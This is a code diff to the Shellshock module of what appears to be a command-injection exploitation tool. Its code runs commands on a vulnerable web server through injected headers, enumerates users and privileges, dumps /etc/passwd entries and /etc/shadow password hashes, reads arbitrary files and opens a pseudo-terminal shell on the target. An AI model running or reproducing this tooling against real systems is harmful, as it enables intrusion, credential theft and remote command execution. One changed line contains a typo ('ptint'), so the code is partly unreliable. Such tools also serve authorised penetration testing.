@@ -83,15 +83,17 @@ def enumeration(url, cve, check_header, filename):
   # Hostname enumeration
   #-------------------------------
   if menu.options.hostname:
+    info_msg = "Fetching hostname."
+    print(settings.print_info_msg(info_msg))
     cmd = settings.HOSTNAME
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
-      info_msg = "The hostname is " +  str(shell) + "."
+      info_msg = "Hostname: " +  str(shell) + "."
       print(settings.print_bold_info_msg(info_msg))
       # Add infos to logs file. 
       output_file = open(filename, "a")
       if not menu.options.no_logging:
-        info_msg = "The hostname is " + str(shell) + ".\n"
+        info_msg = info_msg + "\n"
         output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
       output_file.close()
     else:
@@ -100,9 +102,52 @@ def enumeration(url, cve, check_header, filename):
     settings.ENUMERATION_DONE = True
 
   #-------------------------------
+  # The current user enumeration
+  #-------------------------------
+  if menu.options.current_user:
+    info_msg = "Fetching current user."
+    print(settings.print_info_msg(info_msg))
+    cmd = settings.CURRENT_USER
+    cu_account, payload = cmd_exec(url, cmd, cve, check_header, filename)
+    if cu_account:
+      info_msg = "Current user: " +  str(cu_account) + "."
+      print(settings.print_bold_info_msg(info_msg))
+      # Add infos to logs file.   
+      output_file = open(filename, "a")
+      if not menu.options.no_logging:
+        info_msg = "Current user: " + str(cu_account) + ".\n"
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+      output_file.close()  
+    else:
+      warn_msg = "Heuristics have failed to fetch the current user."
+      print(settings.print_warning_msg(warn_msg))
+    settings.ENUMERATION_DONE = True
+
+  if menu.options.is_root:
+    info_msg = "Testing if current user has excessive privileges."
+    print(settings.print_info_msg(info_msg))
+    cmd = re.findall(r"" + "\$(.*)", settings.IS_ROOT)
+    cmd = ''.join(cmd).replace("(","").replace(")","")
+    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
+    _ = "True"
+    if (settings.TARGET_OS == "win" and not "Admin" in shell) or \
+       (settings.TARGET_OS != "win" and shell != "0"):
+      _ = "False"
+
+    info_msg = "Current user has excessive privileges: " +  str(_)  
+    print(settings.print_bold_info_msg(info_msg))
+    # Add infos to logs file.    
+    output_file = open(filename, "a")
+    if not menu.options.no_logging:
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    output_file.close()
+
+  #-------------------------------
   # Retrieve system information
   #-------------------------------
   if menu.options.sys_info:
+    info_msg = "Fetching the underlying operating system information."
+    print(settings.print_info_msg(info_msg))
     cmd = settings.RECOGNISE_OS            
     target_os, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if target_os:
@@ -110,79 +155,29 @@ def enumeration(url, cve, check_header, filename):
         cmd = settings.DISTRO_INFO
         distro_name, payload = cmd_exec(url, cmd, cve, check_header, filename)
         if len(distro_name) != 0:
-          target_os = target_os + " (" + distro_name + ")"
+          target_os = target_os + " " + distro_name
         cmd = settings.RECOGNISE_HP
         target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
-        if target_arch:
-          info_msg = "The underlying operating system is " +  str(target_os) + Style.RESET_ALL  
-          info_msg += Style.BRIGHT + " and the hardware platform is " +  str(target_arch)  + "."
+        if target_os and target_arch:
+          info_msg = "Operating system: " + str(target_os) + " (" + str(target_arch) + ")"
           print(settings.print_bold_info_msg(info_msg))
           # Add infos to logs file.   
           output_file = open(filename, "a")
           if not menu.options.no_logging:
-            info_msg = "The underlying operating system is " + str(target_os)
-            info_msg += " and the hardware platform is " + str(target_arch) + ".\n"
+            info_msg = info_msg + "\n"
             output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
           output_file.close()
       else:
-        info_msg = "The underlying operating system is " +  target_os  + "."  
+        info_msg = "Operating system: " +  target_os  + "."  
         print(settings.print_bold_info_msg(info_msg))
         # Add infos to logs file.    
         output_file = open(filename, "a")
         if not menu.options.no_logging:
-          info_msg = "The underlying operating system is " + str(target_os) + ".\n"
+          info_msg = "Operating system: " + str(target_os) + ".\n"
           output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
         output_file.close()
     else:
-      warn_msg = "Heuristics have failed to retrieve the system information."
-      print(settings.print_warning_msg(warn_msg))
-    settings.ENUMERATION_DONE = True
-
-  #-------------------------------
-  # The current user enumeration
-  #-------------------------------
-  if menu.options.current_user:
-    cmd = settings.CURRENT_USER
-    cu_account, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if cu_account:
-      if menu.options.is_root:
-        cmd = re.findall(r"" + "\$(.*)", settings.IS_ROOT)
-        cmd = ''.join(cmd).replace("(","").replace(")","")
-        shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-        info_msg = "The current user is " +  str(cu_account)  
-        sys.stdout.write(settings.print_bold_info_msg(info_msg))
-        # Add infos to logs file.    
-        output_file = open(filename, "a")
-        if not menu.options.no_logging:
-          info_msg = "The current user is " + str(cu_account)
-          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-        output_file.close()
-        if shell:
-          if shell != "0":
-              print(Style.BRIGHT + " and it is" + " not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".")
-              # Add infos to logs file.   
-              output_file = open(filename, "a")
-              if not menu.options.no_logging:
-                output_file.write(" and it is not privileged.\n")
-              output_file.close()
-          else:
-            print(Style.BRIGHT + " and it is " +  Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".")
-            # Add infos to logs file.   
-            output_file = open(filename, "a")
-            if not menu.options.no_logging:
-              output_file.write(" and it is privileged.\n")
-            output_file.close()
-      else:
-        info_msg = "The current user is " +  str(cu_account) + "."
-        print(settings.print_bold_info_msg(info_msg))
-        # Add infos to logs file.   
-        output_file = open(filename, "a")
-        if not menu.options.no_logging:
-          info_msg = "The current user is " + str(cu_account) + ".\n"
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
-        output_file.close()  
-    else:
-      warn_msg = "Heuristics have failed to identify the current user."
+      warn_msg = "Heuristics have failed to fetch underlying operating system information."
       print(settings.print_warning_msg(warn_msg))
     settings.ENUMERATION_DONE = True
 
@@ -192,10 +187,9 @@ def enumeration(url, cve, check_header, filename):
   if menu.options.users:
     cmd = settings.SYS_USERS             
     sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    info_msg = "Fetching the content of the file '" + settings.PASSWD_FILE 
+    info_msg = "Fetching content of the file '" + settings.PASSWD_FILE 
     info_msg += "' in order to enumerate users entries. "  
-    sys.stdout.write(settings.print_info_msg(info_msg))
-    sys.stdout.flush()
+    print(settings.print_info_msg(info_msg))
     try:
       if sys_users[0] :
         sys_users = "".join(str(p) for p in sys_users).strip()
@@ -205,11 +199,9 @@ def enumeration(url, cve, check_header, filename):
           sys_users = sys_users.split(" ")
         # Check for appropriate '/etc/passwd' format.
         if len(sys_users) % 3 != 0 :
-          sys.stdout.write(settings.FAIL_STATUS)
-          sys.stdout.flush()
-          warn_msg = "It seems that '" + settings.PASSWD_FILE 
-          warn_msg += "' file is not in the appropriate format. Thus, it is expoted as a text file." 
-          print(settings.print_warning_msg(warn_msg)) 
+          warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is "
+          warn_msg += "not in the appropriate format. Thus, it is expoted as a text file."
+          print(settings.print_warning_msg(warn_msg))
           sys_users = " ".join(str(p) for p in sys_users).strip()
           print(sys_users)
           output_file = open(filename, "a")
@@ -221,11 +213,9 @@ def enumeration(url, cve, check_header, filename):
           for user in range(0, len(sys_users), 3):
              sys_users_list.append(sys_users[user : user + 3])
           if len(sys_users_list) != 0 :
-            sys.stdout.write(settings.SUCCESS_STATUS)
             info_msg = "Identified " + str(len(sys_users_list)) 
             info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
             info_msg += " in '" +  settings.PASSWD_FILE + "'."
-            print(settings.SINGLE_WHITESPACE)
             print(settings.print_bold_info_msg(info_msg))
             # Add infos to logs file.   
             output_file = open(filename, "a")
@@ -266,41 +256,36 @@ def enumeration(url, cve, check_header, filename):
                 else :
                   is_privileged = ""
                   is_privileged_nh = ""
-                print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
+                print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
                 # Add infos to logs file.   
                 output_file = open(filename, "a")
                 if not menu.options.no_logging:
-                  output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
+                  output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + fields[0] + "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
                 output_file.close()
               except ValueError:
                 if count == 1 :
-                  warn_msg = "It seems that '" + settings.PASSWD_FILE 
-                  warn_msg += "' file is not in the appropriate format. "
-                  warn_msg += "Thus, it is expoted as a text file." 
-                  print(settings.print_warning_msg(warn_msg)) 
+                  warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is not in the "
+                  warn_msg += "appropriate format. Thus, it is expoted as a text file." 
+                  print(settings.print_warning_msg(warn_msg))
                 sys_users = " ".join(str(p) for p in sys_users.split(":"))
-                print(sys_users)
+                print(sys_users) 
                 output_file = open(filename, "a")
                 if not menu.options.no_logging:
                   output_file.write("      " + sys_users)
                 output_file.close()
       else:
-        sys.stdout.write(settings.FAIL_STATUS)
-        sys.stdout.flush()
+        print(settings.SINGLE_WHITESPACE)
         warn_msg = "It seems that you don't have permissions to read the '" 
         warn_msg += settings.PASSWD_FILE + "'."
-        print(settings.print_warning_msg(warn_msg))   
+        ptint(settings.print_warning_msg(warn_msg))  
     except TypeError:
-      sys.stdout.write(settings.FAIL_STATUS + "\n")
-      sys.stdout.flush()
       pass
-
     except IndexError:
-      sys.stdout.write(settings.FAIL_STATUS)
+      print(settings.SINGLE_WHITESPACE)
       warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
-      warn_msg += settings.PASSWD_FILE + "'."
+      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
       print(settings.print_warning_msg(warn_msg))
-      pass
+      pass    
     settings.ENUMERATION_DONE = True
 
   #-------------------------------------
@@ -314,50 +299,50 @@ def enumeration(url, cve, check_header, filename):
       sys_passes = sys_passes.replace(" ", "\n")
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
-        info_msg = "Fetching the content of the file '" + settings.SHADOW_FILE 
+        info_msg = "Fetching content of the file '" + settings.SHADOW_FILE 
         info_msg += "' in order to enumerate users password hashes. "  
-        sys.stdout.write(settings.print_info_msg(info_msg))
-        sys.stdout.flush()
-        sys.stdout.write(settings.SUCCESS_STATUS)
-        info_msg = "Identified " + str(len(sys_passes))
-        info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
-        info_msg += " in '" +  settings.SHADOW_FILE + "'."
-        print(settings.SINGLE_WHITESPACE)
-        print(settings.print_bold_info_msg(info_msg))
-        # Add infos to logs file.   
-        output_file = open(filename, "a")
-        if not menu.options.no_logging:
-          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
-        output_file.close()
-        count = 0
-        for line in sys_passes:
-          count = count + 1
-          try:
-            if ":" in line:
-              fields = line.split(":")
-              if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
-                print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1] + Style.RESET_ALL)
-                # Add infos to logs file.   
-                output_file = open(filename, "a")
-                if not menu.options.no_logging:
-                  output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
-                output_file.close()
-          # Check for appropriate (/etc/shadow) format
-          except IndexError:
-            if count == 1 :
-              warn_msg = "It seems that '" + settings.SHADOW_FILE 
-              warn_msg += "' file is not in the appropriate format. "
-              warn_msg += "Thus, it is expoted as a text file."
-              sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
-            print(fields[0])
-            output_file = open(filename, "a")
-            if not menu.options.no_logging:
-              output_file.write("      " + fields[0])
-            output_file.close()
-      else:
-        warn_msg = "It seems that you don't have permissions to read the '"
-        warn_msg += settings.SHADOW_FILE + "' file."
-        print(settings.print_warning_msg(warn_msg))
+        print(settings.print_info_msg(info_msg))
+        sys_passes = sys_passes.replace(" ", "\n")
+        sys_passes = sys_passes.split()
+        if len(sys_passes) != 0 :
+          info_msg = "Identified " + str(len(sys_passes))
+          info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
+          info_msg += " in '" +  settings.SHADOW_FILE + "'."
+          print(settings.print_bold_info_msg(info_msg))
+          # Add infos to logs file.   
+          output_file = open(filename, "a")
+          if not menu.options.no_logging:
+            output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
+          output_file.close()
+          count = 0
+          for line in sys_passes:
+            count = count + 1
+            try:
+              if ":" in line:
+                fields = line.split(":")
+                if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
+                  print("  (" +str(count)+ ") " + Style.BRIGHT + fields[0] + Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
+                  # Add infos to logs file.   
+                  output_file = open(filename, "a")
+                  if not menu.options.no_logging:
+                    output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
+                  output_file.close()
+            # Check for appropriate '/etc/shadow' format.
+            except IndexError:
+              if count == 1 :
+                warn_msg = "It seems that '" + settings.SHADOW_FILE + "' file is not "
+                warn_msg += "in the appropriate format. Thus, it is expoted as a text file."
+                print(settings.print_warning_msg(warn_msg))
+              print(fields[0])
+              output_file = open(filename, "a")
+              if not menu.options.no_logging:
+                output_file.write("      " + fields[0])
+              output_file.close()
+        else:
+          warn_msg = "It seems that you don't have permissions to read the '" 
+          warn_msg += settings.SHADOW_FILE + "' file."
+          print(settings.print_warning_msg(warn_msg))
+
     settings.ENUMERATION_DONE = True  
 
 """
@@ -461,18 +446,19 @@ def file_access(url, cve, check_header, filename):
   #-------------------------------------
   if menu.options.file_read:
     file_to_read = menu.options.file_read.encode(settings.DEFAULT_CODEC).decode()
+    info_msg = "Fetching content of the file: '"  
+    info_msg += file_to_read + "'."
+    print(settings.print_info_msg(info_msg))
     # Execute command
     cmd = "cat " + settings.FILE_READ + file_to_read
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell: 
-      info_msg = "Fetched content of the file '"    
-      info_msg += file_to_read + "'."
-      print(settings.print_bold_info_msg(info_msg))
-      print(settings.print_sub_content(shell))
+      _ = "Fetched file content"
+      print(settings.print_retrieved_data(_, shell))
       output_file = open(filename, "a")
       if not menu.options.no_logging:
-        info_msg = "Extracted content of the file '"
-        info_msg += file_to_read + "' : " + shell + ".\n"
+        info_msg = "Fetched file content '"
+        info_msg += file_to_read + "' : " + shell + "\n"
         output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
       output_file.close()
     else:
@@ -617,11 +603,7 @@ def shellshock_handler(url, http_request_method, filename):
         payload = shellshock_payloads(cve, attack_vector)
 
         # Check if defined "--verbose" option.
-        if settings.VERBOSITY_LEVEL == 1:
-          print(settings.print_payload(payload))
-        elif settings.VERBOSITY_LEVEL >= 2:
-          debug_msg = "Generating payload for the injection."
-          print(settings.print_debug_msg(debug_msg))
+        if settings.VERBOSITY_LEVEL != 0:
           print(settings.print_payload(payload))
         header = {check_header : payload}
         request = _urllib.request.Request(url, None, header)
@@ -683,18 +665,19 @@ def shellshock_handler(url, http_request_method, filename):
           if settings.VERBOSITY_LEVEL != 0:
             checks.total_of_requests()
 
-          info_msg = "The " + check_header + " " + vuln_parameter
-          info_msg += " seems injectable via " + technique + "."
+          finding = check_header + " " + vuln_parameter
+          # Print the findings to terminal.
+          info_msg = finding + " appears to be injectable via " + technique + "."
           if settings.VERBOSITY_LEVEL == 0:
             print(settings.SINGLE_WHITESPACE)
           print(settings.print_bold_info_msg(info_msg))
           print(settings.print_sub_content(payload))
 
           # Enumeration options.
-          if settings.ENUMERATION_DONE == True:
+          if settings.ENUMERATION_DONE:
             while True:
-              message = "Do you want to ignore stored session and enumerate again? [Y/n] > "
-              enumerate_again = common.read_input(message, default="Y", check_batch=True)
+              message = "Do you want to ignore stored session and enumerate again? [y/N] > "
+              enumerate_again = common.read_input(message, default="N", check_batch=True)
               if enumerate_again in settings.CHOICE_YES:
                 enumeration(url, cve, check_header, filename)
                 break
@@ -712,8 +695,8 @@ def shellshock_handler(url, http_request_method, filename):
           # File access options.
           if settings.FILE_ACCESS_DONE == True:
             while True:
-              message = "Do you want to ignore stored session and access files again? [Y/n] > "
-              file_access_again = common.read_input(message, default="Y", check_batch=True)
+              message = "Do you want to ignore stored session and access files again? [y/N] > "
+              file_access_again = common.read_input(message, default="N", check_batch=True)
               if file_access_again in settings.CHOICE_YES:
                 file_access(url, cve, check_header, filename)
                 break
@@ -731,33 +714,32 @@ def shellshock_handler(url, http_request_method, filename):
           if menu.options.os_cmd:
             cmd = menu.options.os_cmd 
             shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-            info_msg =  "Executing the user-supplied command '" + cmd + "'."
+            info_msg =  "Executing the user-supplied command: '" + cmd + "'."
             if shell:
               print(settings.print_info_msg(info_msg))
-              print(settings.SINGLE_WHITESPACE)
-              print(settings.command_execution_output(shell))
-              print(settings.SINGLE_WHITESPACE)
+              _ = "'" + cmd + "' execution output"
+              print(settings.print_retrieved_data(_, shell))
             else:
-              err_msg = "The '" + cmd + "' command, does not return any output."
+              err_msg = "The execution of '" + cmd + "' command does not return any output."
               print(settings.print_critical_msg(err_msg))
 
-          # Pseudo-Terminal shell
-          go_back = False
-          go_back_again = False
-          while True:
-            if go_back == True:
-              break
-            message = "The identified injection point has been exploited. Do you want a pseudo-terminal shell? [Y/n] > "
-            if settings.IS_TTY:
-              gotshell = common.read_input(message, default="Y", check_batch=True)
-            else:
-              gotshell = common.read_input(message, default="n", check_batch=True)
-            if gotshell in settings.CHOICE_YES:
-              print("Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
-              if settings.READLINE_ERROR:
-                checks.no_readline_module()
-              while True:
-                try:
+          try:
+            # Pseudo-Terminal shell
+            go_back = False
+            go_back_again = False
+            while True:
+              if go_back == True:
+                break
+              message = finding + " is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > "
+              if settings.IS_TTY:
+                gotshell = common.read_input(message, default="Y", check_batch=True)
+              else:
+                gotshell = common.read_input(message, default="n", check_batch=True)
+              if gotshell in settings.CHOICE_YES:
+                print(settings.OS_SHELL_TITLE)
+                if settings.READLINE_ERROR:
+                  checks.no_readline_module()
+                while True:
                   if not settings.READLINE_ERROR:
                     checks.tab_autocompleter()
                   sys.stdout.write(settings.OS_SHELL)
@@ -792,41 +774,39 @@ def shellshock_handler(url, http_request_method, filename):
                         print(settings.SINGLE_WHITESPACE)
                         sys.stdout.write(settings.print_payload(payload))
                         print(settings.SINGLE_WHITESPACE)
-                      err_msg = "The '" + cmd + "' command, does not return any output."
+                      err_msg = "The execution of '" + cmd + "' command does not return any output."
                       print(settings.print_critical_msg(err_msg))
-                      print(settings.SINGLE_WHITESPACE)
-
-                except KeyboardInterrupt:
-                  raise
-
-                except SystemExit:
-                  raise
-
-                except EOFError:
-                  if not settings.IS_TTY:
-                    print(settings.SINGLE_WHITESPACE)
-                  err_msg = "Exiting, due to EOFError."
-                  print(settings.print_error_msg(err_msg))
-                  raise
-
-                except TypeError:
+              elif gotshell in settings.CHOICE_NO:
+                if checks.next_attack_vector(technique, go_back) == True:
                   break
-                  
-            elif gotshell in settings.CHOICE_NO:
-              if checks.next_attack_vector(technique, go_back) == True:
-                break
-              else:
-                if no_result == True:
-                  return False 
                 else:
-                  logs.logs_notification(filename)
-                  return True
-            elif gotshell in settings.CHOICE_QUIT:
-              raise SystemExit()
-            else:
-              err_msg = "'" + gotshell + "' is not a valid answer."  
-              print(settings.print_error_msg(err_msg))
-              continue
+                  if no_result == True:
+                    return False 
+                  else:
+                    logs.logs_notification(filename)
+                    return True
+
+              elif gotshell in settings.CHOICE_QUIT:
+                raise SystemExit()
+
+              else:
+                err_msg = "'" + gotshell + "' is not a valid answer."  
+                print(settings.print_error_msg(err_msg))
+                continue
+              break
+          
+          except (KeyboardInterrupt, SystemExit): 
+            print(settings.SINGLE_WHITESPACE)
+            raise
+
+          except EOFError:
+            if not settings.IS_TTY:
+              print(settings.SINGLE_WHITESPACE)
+            err_msg = "Exiting, due to EOFError."
+            print(settings.print_error_msg(err_msg))
+            raise
+
+          except TypeError:
             break
 
     if no_result == True:
